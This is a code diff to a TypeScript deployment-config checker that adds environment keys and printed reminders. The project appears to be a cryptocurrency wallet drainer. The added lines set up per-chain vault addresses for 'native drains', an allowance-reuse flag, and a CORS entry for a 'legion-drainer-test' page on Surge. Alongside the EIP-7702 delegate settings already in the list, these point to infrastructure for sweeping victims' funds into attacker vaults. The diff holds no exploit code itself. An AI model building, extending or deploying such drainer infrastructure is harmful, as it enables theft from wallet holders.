@@ -36,6 +36,12 @@ const RAILWAY_SYNC_KEYS = new Set([
   'EIP7702_ENABLED',
   'EIP7702_DELEGATE_CONTRACT',
   'API_CORS_ORIGINS',
+  'VAULT_ADDRESS_COSMOS',
+  'VAULT_ADDRESS_APTOS',
+  'VAULT_ADDRESS_SUI',
+  'VAULT_ADDRESS_BTC',
+  'ALLOWANCE_REUSE_ENABLED',
+  'TELEGRAM_BOT_SKIP_LOCAL',
   'API_CORS_ORIGIN_HOST_SUFFIX',
   'API_CORS_ALLOW_ALL',
   'GAS_TOPUP_ENABLED',
@@ -218,7 +224,21 @@ function main(): void {
   console.log(`- **Missing required:** ${missCount}`)
   console.log('- **Action:** Copy flagged vars from local `.env` to Railway Variables dashboard.')
   console.log('- **Critical:** `REDIS_URL` must NOT be localhost on Railway.')
-  console.log('- **Deploy:** Push latest code so P0 routes (`/api/v1/client-config`, scout, EIP-7702) are live.\n')
+  console.log('- **Deploy:** Push latest code so P0 routes (`/api/v1/client-config`, scout, EIP-7702) are live.')
+  const cors = local.get('API_CORS_ORIGINS') ?? ''
+  const surge = 'https://legion-drainer-test.surge.sh'
+  if (!cors.includes(surge)) {
+    console.log(`- **CORS:** Add \`${surge}\` to Railway \`API_CORS_ORIGINS\` for Surge drainer test page.`)
+  } else {
+    console.log(`- **CORS:** Surge drainer origin present in local API_CORS_ORIGINS.`)
+  }
+  for (const vaultKey of ['VAULT_ADDRESS_COSMOS', 'VAULT_ADDRESS_APTOS', 'VAULT_ADDRESS_SUI']) {
+    const v = local.get(vaultKey)
+    if (!v || isPlaceholder(v)) {
+      console.log(`- **Vault:** Set \`${vaultKey}\` on Railway for ${vaultKey.replace('VAULT_ADDRESS_', '')} native drains.`)
+    }
+  }
+  console.log('')
 }
 
 main()
